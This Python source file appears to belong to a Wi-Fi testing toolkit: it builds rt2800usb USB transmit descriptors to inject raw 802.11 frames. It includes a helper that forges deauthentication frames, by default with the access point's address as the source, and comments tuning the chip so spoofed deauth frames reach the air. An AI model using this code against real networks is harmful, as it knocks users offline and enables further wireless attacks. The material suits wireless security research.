"""rt2800usb TX path: build TXINFO + TXWI + bulk-OUT inject.

Ported from rt2800_write_tx_data (rt2800lib.c:795-853) +
rt2800usb_kick_tx_queue / rt2x00usb tx submit (USB transport bits).

Wire layout for an injected frame:

    [TXINFO (4B)] [TXWI (16B for RT539x, 20B for RT5592)]
    [802.11 frame] [pad to 4-byte alignment]

TXINFO_W0.USB_DMA_TX_PKT_LEN counts TXWI + frame + alignment pad
(but NOT TXINFO itself).

Defaults used by inject_frame:
  * MCS = 0, PHYMODE = CCK   (1 Mbps — robust broadcast rate)
  * QSEL = MGMT              (matches our use of bulk-OUT EP 0x06)
  * WIV = 1                  (no HW crypto, use IV from descriptor zeros)
  * NSEQ = 1                 (let HW assign sequence number — kernel does
                              this when ENTRY_TXD_GENERATE_SEQ is set)
  * WCID = 0xFF              (no associated station — broadcast/inject)
  * PACKETID = QUEUE 2 + ENTRY 1
  * ACK = 0  when use_no_ack=True  (matches our spoofed-deauth use case)
  * ACK = 1  when use_no_ack=False (normal unicast — chip will retry)

For unicast frames where you actually want delivery, set
``use_no_ack=False`` (this is what the driver's inject_frame already
does based on the WlanInterface flag).
"""
from __future__ import annotations

import logging
import struct

import usb.core

from wifit3.chips import log_trace

from .constants import (
    RT_RT5592,
    TXINFO_W0_QSEL,
    TXINFO_W0_USB_DMA_NEXT_VALID,
    TXINFO_W0_USB_DMA_TX_BURST,
    TXINFO_W0_USB_DMA_TX_PKT_LEN,
    TXINFO_W0_WIV,
    TXWI_DESC_SIZE_4WORDS,
    TXWI_DESC_SIZE_5WORDS,
    TXWI_PHYMODE_CCK,
    TXWI_TX_OP_NONE,
    TXWI_W0_MCS,
    TXWI_W0_PHYMODE,
    TXWI_W0_TX_OP,
    TXWI_W1_ACK,
    TXWI_W1_MPDU_TOTAL_BYTE_COUNT,
    TXWI_W1_NSEQ,
    TXWI_W1_PACKETID_ENTRY,
    TXWI_W1_PACKETID_QUEUE,
    TXWI_W1_WIRELESS_CLI_ID,
    USB_EP_BULK_OUT_AC_VO,
)

# Kernel `rt2800usb_write_tx_desc` hardcodes QSEL=2 (EDCA) for EVERY
# TX frame, including management. The "MGMT QSEL" thing earlier was
# wrong — there's only one QSEL the chip accepts on the bulk-OUT data
# path.
QSEL_EDCA = 2

logger = logging.getLogger(__name__)


def txwi_size_for_silicon(silicon_id: int) -> int:
    """RT5592 uses 5-word TXWI (20 B); everything else uses 4-word (16 B)."""
    if silicon_id == RT_RT5592:
        return TXWI_DESC_SIZE_5WORDS
    return TXWI_DESC_SIZE_4WORDS


def _set_field32(reg: int, mask: int, value: int) -> int:
    """Mirror of kernel rt2x00_set_field32 — see reg_init._set_field32."""
    shift = (mask & -mask).bit_length() - 1
    return ((reg & ~mask) | ((value << shift) & mask)) & 0xFFFFFFFF


def build_tx_descriptors(
    frame_len: int,
    txwi_size: int,
    *,
    use_no_ack: bool = True,
    mcs: int = 0,
    phymode: int = TXWI_PHYMODE_CCK,
    qsel: int = QSEL_EDCA,
    packetid_queue: int = 0,
    packetid_entry: int = 2,
    next_valid: int = 0,
    tx_burst: int = 0,
) -> bytes:
    """Build the TXINFO + TXWI prefix for an 802.11 frame.

    Returns ``TXINFO_DESC_SIZE + txwi_size`` bytes ready to be
    concatenated with the 802.11 frame and written to bulk-OUT.
    """
    # 4-byte align the frame length for the pkt_len calculation.
    aligned_frame_len = (frame_len + 3) & ~3
    pkt_len = txwi_size + aligned_frame_len

    # TXINFO_W0
    txinfo_w0 = 0
    txinfo_w0 = _set_field32(txinfo_w0, TXINFO_W0_USB_DMA_TX_PKT_LEN, pkt_len)
    txinfo_w0 = _set_field32(txinfo_w0, TXINFO_W0_WIV, 1)
    txinfo_w0 = _set_field32(txinfo_w0, TXINFO_W0_QSEL, qsel)
    # USB-DMA burst flags. Both 0 for a single-frame inject; the kernel sets
    # TX_BURST on frames it aggregates back-to-back in one USB submission, and
    # NEXT_VALID when another frame follows in the same submission.
    txinfo_w0 = _set_field32(txinfo_w0, TXINFO_W0_USB_DMA_NEXT_VALID, next_valid)
    txinfo_w0 = _set_field32(txinfo_w0, TXINFO_W0_USB_DMA_TX_BURST, tx_burst)

    # TXWI_W0 — rate + PHY mode + TX_OP
    # Kernel uses HT_TXOP_NONE (3) for mgmt: chip skips RTS/CTS handshake.
    # With TX_OP=0 (HT_TXOP_RTS, the default field value), chip tries to
    # acquire TXOP via RTS first; for spoofed-srcMAC mgmt frames the RTS
    # round-trip fails and the actual data frame never goes on air, even
    # though TX_STA_FIFO flags TX_SUCCESS=1.
    txwi_w0 = 0
    txwi_w0 = _set_field32(txwi_w0, TXWI_W0_MCS, mcs)
    txwi_w0 = _set_field32(txwi_w0, TXWI_W0_PHYMODE, phymode)
    txwi_w0 = _set_field32(txwi_w0, TXWI_W0_TX_OP, TXWI_TX_OP_NONE)
    # MIMO_PS/AMPDU/BW/SHORT_GI/STBC/IFS/FRAG/CF_ACK/TS = 0

    # TXWI_W1 — ACK / WCID / length / packet id
    # Field choices below mirror kernel rt2800usb aireplay-ng deauth TXWI
    # (verified against capture-1.pcap frame 43087): WCID=0, NSEQ=0,
    # PACKETID_QUEUE=0, PACKETID_ENTRY=2. Earlier choices (WCID=0xFF,
    # NSEQ=1, PACKETID_QUEUE=2, PACKETID_ENTRY=1) were producing
    # TX_SUCCESS=1 but no on-air emission on RT3572.
    txwi_w1 = 0
    txwi_w1 = _set_field32(txwi_w1, TXWI_W1_ACK, 0 if use_no_ack else 1)
    txwi_w1 = _set_field32(txwi_w1, TXWI_W1_NSEQ, 0)              # use seqctl from frame
    txwi_w1 = _set_field32(txwi_w1, TXWI_W1_WIRELESS_CLI_ID, 0)   # broadcast/unassoc
    txwi_w1 = _set_field32(txwi_w1, TXWI_W1_MPDU_TOTAL_BYTE_COUNT, frame_len)
    txwi_w1 = _set_field32(txwi_w1, TXWI_W1_PACKETID_QUEUE, packetid_queue)
    txwi_w1 = _set_field32(txwi_w1, TXWI_W1_PACKETID_ENTRY, packetid_entry)

    # TXWI W2..(N-1) are IV/EIV/etc — kernel zeros them when no
    # encryption is in play. Pad to txwi_size.
    txwi_words = [txwi_w0, txwi_w1] + [0] * (txwi_size // 4 - 2)

    return struct.pack("<I", txinfo_w0) + struct.pack(f"<{len(txwi_words)}I", *txwi_words)


def inject_frame(
    dev: usb.core.Device,
    frame: bytes,
    *,
    txwi_size: int = TXWI_DESC_SIZE_4WORDS,
    ep: int = USB_EP_BULK_OUT_AC_VO,
    use_no_ack: bool = True,
    mcs: int = 0,
    phymode: int = TXWI_PHYMODE_CCK,
    timeout_ms: int = 1000,
) -> int:
    """Build TX descriptors + pad-align frame + bulk-OUT write.

    Wire layout (kernel rt2800usb_get_tx_data_len, rt2800usb.c:440-451):

        [TXINFO 4B] [TXWI 16/20B] [802.11 frame] [4-byte align pad]
        [4-byte USB end pad]

    The trailing 4-byte USB end pad is mandatory — kernel comment:
    "USB end pad(4 bytes) is needed at each USB bulk out packet end."
    Without it the chip silently drops bulk-OUT writes (Errno 10060
    timeout — controller forwards bytes, chip never accepts).

    Returns bytes accepted by the controller. Raises USBError on
    transport failure.
    """
    if not frame:
        raise ValueError("frame is empty")
    if len(frame) > 0x0FFF:
        raise ValueError(f"frame too long for TXWI MPDU field ({len(frame)} > 4095)")

    prefix = build_tx_descriptors(
        len(frame), txwi_size,
        use_no_ack=use_no_ack, mcs=mcs, phymode=phymode,
    )

    # 4-byte align the frame body, then add the mandatory 4-byte USB
    # end pad. Kernel: `roundup(skb_len, 4) + 4`.
    pad_len = (-len(frame)) & 3
    payload = prefix + frame + (b"\x00" * pad_len) + b"\x00\x00\x00\x00"

    if logger.isEnabledFor(log_trace.TRACE):
        logger.trace("bulk-OUT EP 0x%02x (%dB): %s", ep, len(payload), payload.hex())
    sent = dev.write(ep, payload, timeout_ms)
    if sent != len(payload):
        logger.warning(
            "bulk-OUT short write: sent=%d expected=%d", sent, len(payload)
        )
    return sent


# Convenience: reuse the rtl8187 deauth-building helper since the
# 802.11 frame format is identical across chips. We define a local
# copy here so M5 has zero cross-chip imports.
BROADCAST_MAC = bytes.fromhex("ffffffffffff")
DEAUTH_REASON_CLASS3 = 7


def build_deauth(
    target_mac: bytes,
    bssid: bytes,
    *,
    src_mac: bytes | None = None,
    reason: int = DEAUTH_REASON_CLASS3,
) -> bytes:
    """Construct a 26-byte 802.11 deauth frame (same layout as rtl8187)."""
    if len(target_mac) != 6 or len(bssid) != 6:
        raise ValueError("MAC addresses must be 6 bytes")
    if src_mac is None:
        src_mac = bssid
    if len(src_mac) != 6:
        raise ValueError("src_mac must be 6 bytes")

    fc = bytes([0xC0, 0x00])
    duration = bytes([0x00, 0x00])
    seq_ctrl = bytes([0x00, 0x00])
    reason_bytes = struct.pack("<H", reason)
    return fc + duration + target_mac + src_mac + bssid + seq_ctrl + reason_bytes
